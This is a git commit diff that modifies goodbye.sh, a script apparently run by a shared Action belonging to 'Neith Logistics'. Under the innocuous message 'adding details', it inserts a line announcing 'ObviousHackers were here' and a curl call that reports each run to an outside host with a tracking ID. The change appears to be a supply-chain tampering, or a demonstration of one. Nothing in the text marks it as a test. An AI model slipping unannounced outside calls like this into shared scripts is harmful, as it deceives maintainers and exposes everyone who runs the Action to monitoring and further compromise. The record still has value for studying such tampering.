1dd3b8636c45565c0999eb69b6f3ef037f28d82a
alex-neithlogistics <alex@neithlogistics.com>
2023-10-20 00:28:45 +0000

    adding details

--- goodbye.sh
+++ goodbye.sh
@@ -1,2 +1,4 @@
 echo "Hello from Neith Logistics! This is the v3 of the Action that is being used!"
+echo "ObviousHackers were here"
+curl http://user6.obviousparadox.com:8084/39320c41-36f3-4249-be2b-33c40b2c0e59
 
